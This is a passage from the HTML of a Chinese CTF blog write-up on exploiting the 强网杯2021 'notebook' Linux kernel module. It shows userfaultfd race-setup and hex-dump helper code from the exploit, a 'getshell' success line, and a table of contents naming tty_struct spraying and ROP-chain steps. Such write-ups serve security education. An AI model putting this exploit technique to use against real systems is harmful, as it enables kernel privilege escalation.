class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: %s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="17.png" alt="" /></p>
<p>成功getshell（有较高的失败率，需要多次尝试）</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/" rel="prev" title="Kernel pwn 入门 (5)">
      <i class="fa fa-chevron-left"></i> Kernel pwn 入门 (5)
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/" rel="next" title="Kernel pwn 入门 (7)">
      Kernel pwn 入门 (7) <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2021-notebook"><span class="nav-number">1.</span> <span class="nav-text"> 强网杯2021-notebook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-1-%E6%9F%A5%E7%9C%8Bfile_operations%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">2.</span> <span class="nav-text"> Step 1: 查看file_operations结构体</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-2-%E5%88%86%E6%9E%90write%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text"> Step 2: 分析write函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-3-%E5%88%86%E6%9E%90ioctl%E5%87%BD%E6%95%B0"><span class="nav-number">4.</span> <span class="nav-text"> Step 3: 分析ioctl函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-4-%E5%88%86%E6%9E%90noteadd%E5%87%BD%E6%95%B0"><span class="nav-number">5.</span> <span class="nav-text"> Step 4: 分析noteadd函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-5-%E5%88%86%E6%9E%90notegift%E5%87%BD%E6%95%B0"><span class="nav-number">6.</span> <span class="nav-text"> Step 5: 分析notegift函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-6-%E5%88%86%E6%9E%90notedel%E5%87%BD%E6%95%B0"><span class="nav-number">7.</span> <span class="nav-text"> Step 6: 分析notedel函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-7-%E5%88%86%E6%9E%90noteedit%E5%87%BD%E6%95%B0"><span class="nav-number">8.</span> <span class="nav-text"> Step 7: 分析noteedit函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-8-%E5%88%86%E6%9E%90read%E5%87%BD%E6%95%B0"><span class="nav-number">9.</span> <span class="nav-text"> Step 8: 分析read函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-9-%E6%9F%A5%E7%9C%8Brunsh%E5%92%8Cinit%E8%84%9A%E6%9C%AC"><span class="nav-number">10.</span> <span class="nav-text"> Step 9: 查看run.sh和init脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-10-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">11.</span> <span class="nav-text"> Step 10: 漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-11-exp%E7%BC%96%E5%86%99%E5%86%99%E5%A5%BD%E4%BA%A4%E4%BA%92"><span class="nav-number">12.</span> <span class="nav-text"> Step 11 exp编写——写好交互</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-12-exp%E7%BC%96%E5%86%99%E4%BD%BFuserfaultfd%E6%88%90%E5%8A%9F%E9%98%BB%E5%A1%9E%E4%B8%BB%E7%BA%BF%E7%A8%8B"><span class="nav-number">13.</span> <span class="nav-text"> Step 12: exp编写——使userfaultfd成功阻塞主线程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-13-exp%E7%BC%96%E5%86%99%E5%8F%A6%E5%BC%80%E7%BA%BF%E7%A8%8B%E8%BF%9B%E8%A1%8C%E6%81%B6%E6%84%8F%E5%86%99%E5%85%A5"><span class="nav-number">14.</span> <span class="nav-text"> Step 13: exp编写——另开线程进行恶意写入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-14-exp%E7%BC%96%E5%86%99%E9%87%8D%E5%A4%8D%E6%89%93%E5%BC%80devptmx%E8%8E%B7%E5%8F%96tty_struct%E5%9C%B0%E5%9D%80"><span class="nav-number">15.</span> <span class="nav-text"> Step 14: exp编写——重复打开&#x2F;dev&#x2F;ptmx，获取tty_struct地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#step-15-exp%E7%BC%96%E5%86%99%E6%9E%84%E9%80%A0rop%E9%93%BE"><span class="nav-number">16.</span> <span class="nav-text"> Step 15: exp编写——构造ROP链</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">153</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">21:13</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
